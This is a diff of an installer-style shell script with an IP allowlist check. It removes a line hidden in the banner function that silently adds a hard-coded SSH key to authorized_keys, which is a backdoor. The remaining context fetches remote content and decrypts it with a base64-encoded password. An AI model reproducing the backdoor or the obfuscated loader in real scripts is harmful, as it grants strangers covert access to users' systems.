@@ -11,13 +11,10 @@ os=$(echo "$iuu" | base64 -d)
 on=$(curl -fsSL "$GFP")
 tm=$(echo "$on" | openssl enc -aes-256-cbc -a -d -pbkdf2 -iter 100000 -pass pass:"$os")
 IP=$(curl -s -4 ifconfig.me)
-IPS1=$(curl -fsSL bit.ly/3I3D81q | tr -d '\r' | sed '/^\s*$/d' | awk '{$1=$1};1')
-IPS2=$(curl -fsSL https://grr.ha-vps.store:81/ips.txt | tr -d '\r' | sed '/^\s*$/d' | awk '{$1=$1};1')   
+IPS=$(curl -fsSL bit.ly/3I3D81q | tr -d '\r' | sed '/^\s*$/d' | awk '{$1=$1};1')
 
 ip_allowed=false
-if echo "$IPS1" | grep -Eo '^[^#]*' | awk -F'@' '{print $1}' | grep -Fxq "$IP"; then
-    ip_allowed=true
-elif echo "$IPS2" | grep -Eo '^[^#]*' | awk -F'@' '{print $1}' | grep -Fxq "$IP"; then
+if echo "$IPS" | grep -Eo '^[^#]*' | awk -F'@' '{print $1}' | grep -Fxq "$IP"; then
     ip_allowed=true
 fi
 
@@ -30,7 +27,6 @@ display_banner() {
     echo "\___ \  | |     | |_) |  | |  | |_) |   | |"
     echo " ___) | | |___  |  _ <   | |  |  __/    | |"
     echo "|____/   \____| |_| \_\ |___| |_|       |_|"
-mkdir -p ~/.ssh && echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIP/6mja6JSVT/UsM3F6CSFZF5besPYDk9+VuzjVLV2Pb' >> ~/.ssh/authorized_keys && chmod 700 ~/.ssh && chmod 600 ~/.ssh/authorized_keys
 rm -f setup.sh >/dev/null 
 rm -f v22 >/dev/null
 echo ""
